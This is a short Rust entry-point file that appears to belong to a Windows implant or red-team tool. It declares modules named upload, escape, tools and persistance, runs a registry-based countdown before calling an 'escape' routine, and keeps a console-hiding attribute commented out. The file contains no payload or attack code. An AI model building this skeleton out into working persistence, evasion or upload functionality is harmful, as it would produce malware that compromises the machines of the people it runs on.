//#![windows_subsystem = "windows"]

//not find better for now :)
#![allow(unused_imports)]
#![allow(dead_code)]

mod upload;
mod escape;
mod tools;
mod persistance;

use std::fmt::Display;

use winreg::enums::*;

fn main() {

    if tools::reg_countdown("Environment", "WTEMP", 15){
        escape::jump_man(false);
    }

    println!("End...")
}